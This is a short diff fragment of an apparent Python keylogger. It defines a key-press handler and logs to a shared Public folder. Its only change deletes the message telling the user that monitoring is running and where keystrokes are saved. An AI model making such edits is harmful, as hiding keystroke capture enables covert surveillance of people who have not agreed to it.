@@ -18,7 +18,6 @@ def main():
             return
 
     log_path = r"C:\Users\Public\global_log.txt"
-    print(f"Monitoring for {duration} seconds... saving to {log_path}")
 
     # 2. Define what happens on each key press
     def on_press(key):
